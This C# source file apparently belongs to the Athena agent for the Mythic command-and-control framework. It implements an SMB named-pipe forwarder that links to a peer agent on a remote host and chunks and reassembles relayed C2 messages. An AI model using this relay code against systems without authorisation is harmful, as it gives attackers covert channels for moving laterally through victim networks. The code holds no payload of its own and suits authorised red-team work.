using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using H.Pipes;
using H.Pipes.Args;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using System.Text.Json;

namespace Athena.Forwarders
{
    public class Forwarder : IForwarder
    {
        public bool connected { get; set; }
        private PipeClient<DelegateMessage> clientPipe { get; set; }
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();

        public Forwarder()
        {
        }

        //Link to the Athena SMB Agent
        public async Task<bool> Link(MythicJob job, string uuid)
        {
            Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
            try
            {
                if (this.clientPipe is null || !this.connected)
                {
                    this.clientPipe = new PipeClient<DelegateMessage>(par["pipename"], par["hostname"]);
                    this.clientPipe.MessageReceived += (o, args) => OnMessageReceive(args);
                    this.clientPipe.Connected += (o, args) => this.connected = true;
                    this.clientPipe.Disconnected += (o, args) => this.connected = false;
                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;
                        return true;
                    }
                }
            }
            catch (Exception e) 
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in link: {e}");
            }

            return false;
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                IEnumerable<string> parts = dm.message.SplitByLength(4000);
                dm.final = false;

                Debug.WriteLine($"[{DateTime.Now}] Sending message with size of {dm.message.Length} in {parts.Count()} chunks.");
                foreach (string part in parts)
                {
                    dm.message = part;

                    if (part == parts.Last())
                    {
                        dm.final = true;
                    }
                    Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {dm.final}");
                    await this.clientPipe.WriteAsync(dm);
                }
                return true;
            }
            catch (Exception e )
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in send: {e}");
                return false;
            }
        }
        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            try
            {
                await this.clientPipe.DisconnectAsync();
                this.connected = false;
                await this.clientPipe.DisposeAsync();
                this.partialMessages.Clear();
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }
        private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
        {
            Debug.WriteLine($"[{DateTime.Now}] Message received from pipe {args.Message.message.Length} bytes");
            try
            {
                if (this.partialMessages.ContainsKey(args.Message.uuid))
                {
                    if (args.Message.final)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Final chunk received.");
                        string oldMsg = args.Message.message;

                        args.Message.message = this.partialMessages[args.Message.uuid].Append(oldMsg).ToString();

                        await DelegateResponseHandler.AddDelegateMessageAsync(args.Message);
                        this.partialMessages.Remove(args.Message.uuid, out _);

                    }
                    else //Not Last Message but we already have a value in the partial messages
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Appending message to existing tracker.");
                        this.partialMessages[args.Message.uuid].Append(args.Message.message);
                    }
                }
                else //First time we've seen this message
                {
                    if (args.Message.final)
                    {
                        Debug.WriteLine($"[{DateTime.Now}] Final chunk received.");
                        await DelegateResponseHandler.AddDelegateMessageAsync(args.Message);
                    }
                    else
                    {
                        Debug.WriteLine($"[{DateTime.Now}] First chunk received.");
                        this.partialMessages.GetOrAdd(args.Message.uuid, new StringBuilder(args.Message.message)); //Add value to our Collection
                    }
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine($"[{DateTime.Now}] Error in SMB Forwarder: {e}");
            }
        }
    }
    class SmbMessage
    {
        public string uuid;
        public string message;
        public int chunks;
        public int chunk;
    }
}
